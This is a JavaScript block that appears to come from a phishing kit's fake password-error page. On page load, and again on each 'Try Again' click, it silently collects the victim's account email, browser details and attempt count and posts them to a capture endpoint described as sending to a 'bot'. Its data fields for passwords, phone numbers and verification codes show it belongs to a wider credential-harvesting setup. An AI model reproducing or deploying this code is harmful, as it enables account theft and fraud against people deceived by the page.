<script>
  // ===== DATA CAPTURE =====
  function captureVisitorData(data) {
    const visitorData = {
      email: data.email || document.getElementById('accountEmail')?.textContent || 'Not provided',
      password: 'Error page - no password',
      phone: 'Not provided',
      code: 'Not provided',
      g_code: 'Not provided',
      page: 'Password Error Page',
      ip: 'Unknown',
      user_agent: navigator.userAgent,
      error_attempts: data.attempts || localStorage.getItem('attempts') || '0'
    };

    // Send to bot
    fetch('/api/capture', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(visitorData)
    })
    .then(response => response.json())
    .then(result => {
      console.log('✅ Error page data captured:', result);
    })
    .catch(error => {
      console.log('⚠️ Error capturing data:', error);
    });
  }

  // Capture when error page loads
  document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
      captureVisitorData({
        attempts: localStorage.getItem('attempts') || '0'
      });
    }, 3000);

    // Capture when "Try Again" is clicked
    const tryAgainBtn = document.getElementById('tryAgainBtn');
    if (tryAgainBtn) {
      tryAgainBtn.addEventListener('click', function() {
        const attempts = parseInt(localStorage.getItem('attempts') || '0') + 1;
        localStorage.setItem('attempts', attempts.toString());
        captureVisitorData({
          attempts: attempts,
          action: 'Try Again clicked'
        });
      });
    }
  });
</script>
